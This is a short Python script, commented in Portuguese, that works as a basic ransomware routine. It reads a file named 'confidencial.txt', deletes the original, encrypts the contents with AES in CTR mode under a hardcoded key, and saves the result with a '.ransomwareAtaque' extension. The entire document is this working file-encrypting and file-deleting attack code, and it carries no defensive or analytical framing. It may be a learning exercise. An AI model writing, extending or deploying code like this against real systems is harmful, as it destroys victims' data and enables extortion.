import os
import pyaes

## abrir o arquivo alvo para ser criptografado
file_name = "confidencial.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo original
os.remove(file_name)

## chave de criptografia
key = b"brokzransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo alvo criptografado
new_file = file_name + ".ransomwareAtaque"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
